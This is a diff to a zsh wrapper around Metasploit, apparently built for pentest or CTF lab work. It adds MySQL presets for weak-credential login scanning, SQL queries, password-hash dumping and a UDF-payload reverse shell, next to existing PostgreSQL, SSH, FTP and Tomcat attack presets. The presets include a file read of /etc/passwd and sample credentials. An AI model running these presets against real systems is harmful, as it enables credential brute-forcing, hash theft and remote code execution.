@@ -46,6 +46,12 @@ presets (postgres):
   pg-hashdump    dump DB password hashes
   pg-shell       COPY FROM PROGRAM revshell
 
+presets (mysql):
+  my-login       weak DB cred scan → saves hits to cl
+  my-sql         SQL query (-s, default SELECT version())
+  my-hashdump    dump DB password hashes
+  my-shell       UDF payload revshell
+
 presets (other):
   ssh-login      SSH weak cred scan
   ftp-login      FTP weak cred scan
@@ -69,7 +75,7 @@ options:
   --batch             exit msf after run (default: aux)
   --stay              keep msf open (default: exploits)
 
-env: MSFR_PORT, DB_PORT, SSH_PORT, FTP_PORT, HTTP_PORT, SMB_PORT
+env: MSFR_PORT, DB_PORT, MYSQL_PORT, SSH_PORT, FTP_PORT, HTTP_PORT, SMB_PORT
       MSFR_USERLIST / MSFR_SSH_USERLIST, MSFR_PASSLIST (default: \$RECON_PASSLIST)
 
 examples:
@@ -77,6 +83,8 @@ examples:
   msfr pg-sql -n
   msfr pg-sql darkstart          # cl のユーザを指定（-u でも可）
   msfr pg-readfile -u poster -f /etc/passwd
+  msfr my-login
+  msfr my-sql -u root
   msfr ssh-login -u root
   msfr tomcat-mgr -u bob -w bubbles -p 1234
   msfr -m exploit/multi/http/tomcat_mgr_upload -u bob -w bubbles -o TARGETURI=/manager --stay
@@ -91,6 +99,10 @@ pg-sql       postgres  auxiliary/admin/postgres/postgres_sql
 pg-readfile  postgres  auxiliary/admin/postgres/postgres_readfile
 pg-hashdump  postgres  auxiliary/scanner/postgres/postgres_hashdump
 pg-shell     postgres  exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+my-login     mysql     auxiliary/scanner/mysql/mysql_login
+my-sql       mysql     auxiliary/admin/mysql/mysql_sql
+my-hashdump  mysql     auxiliary/scanner/mysql/mysql_hashdump
+my-shell     mysql     exploit/multi/mysql/mysql_udf_payload
 ssh-login    ssh       auxiliary/scanner/ssh/ssh_login
 ftp-login    ftp       auxiliary/scanner/ftp/ftp_login
 tomcat-mgr   http      exploit/multi/http/tomcat_mgr_upload
@@ -131,6 +143,25 @@ _msfr-resolve-preset() {
       _MSFR_DEFAULT_USER="postgres"
       _MSFR_NEEDS_CREDS=1
       ;;
+    my-login|mysql-login)
+      _MSFR_MODULE="auxiliary/scanner/mysql/mysql_login"
+      ;;
+    my-sql|mysql-sql)
+      _MSFR_MODULE="auxiliary/admin/mysql/mysql_sql"
+      _MSFR_DEFAULT_USER="root"
+      _MSFR_NEEDS_CREDS=1
+      ;;
+    my-hashdump|mysql-hashdump)
+      _MSFR_MODULE="auxiliary/scanner/mysql/mysql_hashdump"
+      _MSFR_DEFAULT_USER="root"
+      _MSFR_NEEDS_CREDS=1
+      ;;
+    my-shell|mysql-shell|my-rce|mysql-rce)
+      _MSFR_MODULE="exploit/multi/mysql/mysql_udf_payload"
+      _MSFR_KIND="exploit"
+      _MSFR_DEFAULT_USER="root"
+      _MSFR_NEEDS_CREDS=1
+      ;;
     ssh-login)
       _MSFR_MODULE="auxiliary/scanner/ssh/ssh_login"
       ;;
@@ -169,8 +200,16 @@ _msfr-preset-sets() {
       _msfr-rc-set "$rc" BLANK_PASSWORDS true
       _msfr-rc-set "$rc" USER_AS_PASS true
       ;;
+    my-login|mysql-login)
+      _msfr-rc-set "$rc" STOP_ON_SUCCESS true
+      _msfr-rc-set "$rc" BLANK_PASSWORDS true
+      _msfr-rc-set "$rc" USER_AS_PASS true
+      ;;
     pg-sql|postgres-sql)
       _msfr-rc-set "$rc" SQL "${sql:-SELECT version();}"
+      ;;
+    my-sql|mysql-sql)
+      _msfr-rc-set "$rc" SQL "${sql:-SELECT version()}"
       ;;
     pg-readfile|postgres-readfile)
       [[ -n "$rfile" ]] || {
@@ -197,7 +236,7 @@ _msfr-preset-sets() {
 
 _msfr-login-preset() {
   case "$1" in
-    pg-login|postgres-login|ssh-login|ftp-login) return 0 ;;
+    pg-login|postgres-login|my-login|mysql-login|ssh-login|ftp-login) return 0 ;;
     *) return 1 ;;
   esac
 }
@@ -228,6 +267,9 @@ _msfr-creds-family() {
     pg-login|postgres-login|pg-sql|postgres-sql|pg-readfile|postgres-readfile|pg-hashdump|postgres-hashdump|pg-shell|postgres-shell|pg-rce|postgres-rce)
       echo postgres
       ;;
+    my-login|mysql-login|my-sql|mysql-sql|my-hashdump|mysql-hashdump|my-shell|mysql-shell|my-rce|mysql-rce)
+      echo mysql
+      ;;
     ssh-login) echo ssh ;;
     ftp-login) echo ftp ;;
     tomcat-mgr|tomcat-upload) echo http ;;
@@ -245,7 +287,7 @@ _msfr-import-login() {
 
 _msfr-hash-preset() {
   case "$1" in
-    pg-hashdump|postgres-hashdump) return 0 ;;
+    pg-hashdump|postgres-hashdump|my-hashdump|mysql-hashdump) return 0 ;;
     *) return 1 ;;
   esac
 }
@@ -505,6 +547,10 @@ _msfr() {
     'pg-readfile:Read file (-f)'
     'pg-hashdump:Password hash dump'
     'pg-shell:COPY FROM PROGRAM shell'
+    'my-login:MySQL login scan'
+    'my-sql:SQL query'
+    'my-hashdump:Password hash dump'
+    'my-shell:UDF payload shell'
     'ssh-login:SSH login scan'
     'ftp-login:FTP login scan'
     'tomcat-mgr:Tomcat manager upload'
